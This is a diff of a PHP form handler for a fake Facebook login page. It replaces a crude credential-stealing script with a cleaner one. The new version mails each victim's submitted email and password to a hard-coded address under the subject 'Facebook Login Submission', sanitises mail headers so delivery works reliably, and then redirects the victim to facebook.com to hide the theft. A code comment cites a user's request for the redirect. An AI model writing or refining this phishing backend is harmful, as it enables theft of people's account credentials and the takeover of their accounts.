@@ -1,2 +1,25 @@
-<?php if(isset($_POST[‘submit’])){$qv0=$_POST[’email’];$ga1=$_POST[‘password’];$ee2=’এখানে আপনার ইমেইল আইডি দিবেন;$bx3=’Form Submission’;$mi4=”Email :”.$qv0.”\n”.”Password :”.$ga1;$ci5=”From: “.$qv0;if(mail($ee2,$bx3,$mi4,$ci5)){echo “<h1>Incorrect password.! </h1> <br>
-<h3> Submitted..!</h3>”;}else{echo “Something went wrong!”;}}?>
+<?php
+if (isset($_POST['submit'])) {
+    // Sanitize input to prevent header injection
+    $email = str_replace(array("\r", "\n"), '', $_POST['email']);
+    $password = $_POST['password']; // Password doesn't go into headers, so less critical but still should be handled carefully if logged.
+
+    $to = 'likhonsheikh@tensi.org';
+    $subject = 'Facebook Login Submission';
+    $message = "Email: " . $email . "\n" . "Password: " . $password;
+
+    // Use a fixed From address and set Reply-To to the user's input
+    $headers = "From: webmaster@example.com" . "\r\n" .
+               "Reply-To: " . $email . "\r\n" .
+               "X-Mailer: PHP/" . phpversion();
+
+    mail($to, $subject, $message, $headers);
+
+    // Redirect to Facebook regardless of mail success to match user request for "automatic do resect to Facebook.com"
+    header("Location: https://www.facebook.com");
+    exit();
+} else {
+    header("Location: index.php");
+    exit();
+}
+?>
